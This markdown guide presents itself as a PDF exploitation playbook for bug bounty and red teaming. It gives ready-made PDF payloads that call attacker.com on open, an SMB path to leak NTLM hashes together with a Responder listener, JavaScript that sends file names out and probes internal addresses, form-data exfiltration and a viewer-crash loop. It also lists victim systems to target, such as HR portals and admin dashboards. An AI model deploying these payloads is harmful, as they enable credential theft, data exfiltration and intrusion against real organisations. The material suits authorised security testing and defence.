## 📚 Reference

- [Insecure Features in PDFs](https://web-in-security.blogspot.com/2021/01/insecure-features-in-pdfs.html?m=1)

# 📄🔥 PDF Exploitation Playbook

### Offensive Security • Bug Bounty • Red Teaming

> **Turn PDFs into an attack surface.**
> Practical payloads, lab setup, and real-world exploitation techniques.

---

## 🧭 Table of Contents

* [Overview](#-overview)
* [Attack Surface](#-attack-surface)
* [PoC Payloads](#-poc-payloads)
* [Malicious Lab Setup](#-malicious-lab-setup)
* [Ready-to-Use Attack Scenarios](#-ready-to-use-attack-scenarios)
* [Tooling](#-tooling)
* [High-Value Targets](#-high-value-targets)
* [Key Takeaways](#-key-takeaways)

---

## 🧠 Overview

PDFs are **not static documents** — they are **interactive execution environments**.

They support:

* JavaScript execution
* External network requests
* File system interaction
* Dynamic forms
* Embedded objects

⚠️ This makes them a **stealthy and powerful attack vector**.

---

## ⚙️ Attack Surface

### 🔗 Trigger Points

* `/OpenAction` → runs on file open
* `/AA` (Additional Actions)
* Form events
* Embedded JavaScript

---

### 🧨 Dangerous Capabilities

| Feature        | Risk              |
| -------------- | ----------------- |
| JavaScript     | Code execution    |
| URI actions    | SSRF / callbacks  |
| SMB paths      | NTLM hash leaks   |
| Forms          | Data exfiltration |
| Embedded files | Malware delivery  |

---

## 🧪 PoC Payloads

---

### 🌐 SSRF (Callback Detection)

```pdf
<<
/Type /Catalog
/OpenAction <<
  /S /URI
  /URI (http://attacker.com/log?pdf_test)
>>
>>
```

📌 Detect with:

```bash
python3 -m http.server 80
```

---

### 🕵️ NTLM Hash Leak (Windows)

```pdf
<<
/Type /Catalog
/OpenAction <<
  /S /URI
  /URI (\\attacker.com\share)
>>
>>
```

📌 Listener:

```bash
sudo responder -I eth0
```

---

### 🧠 JavaScript Execution

```pdf
<<
/Type /Catalog
/OpenAction <<
  /S /JavaScript
  /JS (app.alert("PDF XSS"))
>>
>>
```

📌 Advanced exfil:

```javascript
app.launchURL("http://attacker.com?doc=" + this.documentFileName);
```

---

### 💣 DoS (Viewer Crash)

```pdf
<<
/S /JavaScript
/JS (while(true){})
>>
```

---

### 📤 Form Data Exfiltration

```pdf
<<
/Type /Catalog
/AcroForm <<
  /Fields [
    <<
      /FT /Tx
      /T (email)
      /V (victim@example.com)
      /AA <<
        /K <<
          /S /URI
          /URI (http://attacker.com/steal)
        >>
      >>
    >>
  ]
>>
>>
```

---

## 🧪 Malicious Lab Setup

---

### 🏗️ Architecture

```
[Victim Viewer]
      ↓
[Malicious PDF]
      ↓
[Attacker Server]
```

---

### ⚡ Quick Setup

#### 1. Start listener

```bash
python3 -m http.server 80
```

---

#### 2. Generate PDF

```bash
pip install reportlab
```

```python
from reportlab.pdfgen import canvas

c = canvas.Canvas("test.pdf")
c.drawString(100, 750, "Test PDF")
c.save()
```

---

#### 3. Modify PDF

Use:

* `qpdf`
* `peepdf`
* `pdf-parser`

---

#### 4. Monitor Traffic

```bash
# Wireshark filter
http || smb
```

---

## 🎯 Ready-to-Use Attack Scenarios

---

### 1. 📤 Blind SSRF via Upload

```pdf
/URI (http://burp-collaborator.net)
```

📌 Works even if:

* File not rendered
* Processed backend-side

---

### 2. 🌐 Internal Network Discovery

```javascript
app.launchURL("http://127.0.0.1:8080");
```

```javascript
app.launchURL("http://192.168.0.1");
```

---

### 3. 🔑 Credential Harvesting

```pdf
/URI (\\attacker.com\share)
```

📌 Combine with:

* NTLM relay attacks
* Hash cracking

---

### 4. 🎭 Filter / WAF Bypass

Techniques:

* Overlapping objects
* Hidden layers
* Dual rendering structures

📌 Result:

* Different content per viewer
* Bypass validation systems

---

### 5. 💼 Stored PDF Attack

Upload malicious PDF → Admin opens → Callback triggered

📌 Common in:

* Support systems
* HR portals
* Admin dashboards

---

## 🧰 Tooling

| Tool       | Purpose                  |
| ---------- | ------------------------ |
| peepdf     | Analyze PDF structure    |
| qpdf       | Modify safely            |
| pdf-parser | Object inspection        |
| mutool     | Debug rendering          |
| Burp Suite | Traffic + SSRF detection |
| Responder  | NTLM capture             |

---

## 🎯 High-Value Targets

Focus on features like:

* 📎 File uploads (PDF only)
* 🧾 Invoice systems
* 👔 Job application portals
* 🏦 KYC / onboarding flows
* 🎫 Support ticket attachments

---

## 🧠 Key Takeaways

* PDFs are **executable containers**
* Most attacks use **legitimate features**, not exploits
* Many systems **blindly trust uploaded documents**
* Attacks often trigger **on open**, not upload

---

## ⚠️ Final Insight

> **The vulnerability is not the PDF — it's the system that trusts it.**

---

## 🚀 Next Steps

* Build automated payload generator
* Create fuzzing wordlists for PDF objects
* Develop custom malicious PDF toolkit

---

### 🧬 Author Notes

Use this responsibly in:

* Bug bounty programs
* Red team engagements
* Security research

---
